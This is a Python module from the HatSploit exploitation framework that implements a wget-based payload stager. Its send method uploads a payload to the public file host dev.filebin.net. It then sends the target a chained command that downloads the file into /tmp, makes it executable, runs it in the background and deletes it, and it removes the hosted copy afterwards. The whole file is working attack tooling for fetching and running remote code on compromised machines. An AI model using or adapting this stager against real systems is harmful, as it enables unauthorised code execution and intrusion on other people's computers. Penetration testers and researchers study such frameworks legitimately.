#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import binascii
import os
import requests

from hatsploit.core.cli.badges import Badges


class Wget:
    badges = Badges()

    def send(self, payload, sender, args=[], payload_args="", delim=';',
             location='/tmp', linemax=100):
        self.badges.print_process("Sending payload stage...")
        filename = binascii.hexlify(os.urandom(8)).decode()
        path = location + '/' + filename

        wget_bin = binascii.hexlify(os.urandom(8)).decode()
        wget_file = binascii.hexlify(os.urandom(8)).decode()

        wget_container = f"https://dev.filebin.net/{wget_bin}"
        wget_server = f"https://dev.filebin.net/{wget_bin}/{wget_file}"

        wget_stream = "wget '{}' -qO {}"

        requests.post(wget_server.format(wget_bin, wget_file), data=payload)
        self.badges.print_process("Uploading payload...")

        self.badges.print_process("Executing payload...")
        command = f"{wget_stream.format(wget_server, path)} {delim} chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}"
        args = args if args is not None else ""

        sender(*args, {command})
        requests.delete(wget_container)
